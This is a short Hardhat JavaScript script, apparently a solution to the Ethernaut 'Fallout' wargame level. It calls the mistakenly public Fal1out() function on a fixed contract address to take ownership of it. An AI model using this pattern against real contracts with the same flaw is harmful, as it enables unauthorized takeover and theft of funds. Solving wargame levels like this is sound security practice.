const { ethers } = require("hardhat");
console.clear();
const abi = new ethers.utils.Interface([
  "function Fal1out() public payable",
  "function withdraw() public",
]);
async function main() {
  const target = "0xe1f0558C8FB4577DC83D4e60690A3b6724f9EA35";
  const user = await ethers.getSigner(0);
  const targetContract = await ethers.getContractAt(abi, target);
  const txn = await targetContract.Fal1out();
  await txn.wait();
  console.log(txn.hash);
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
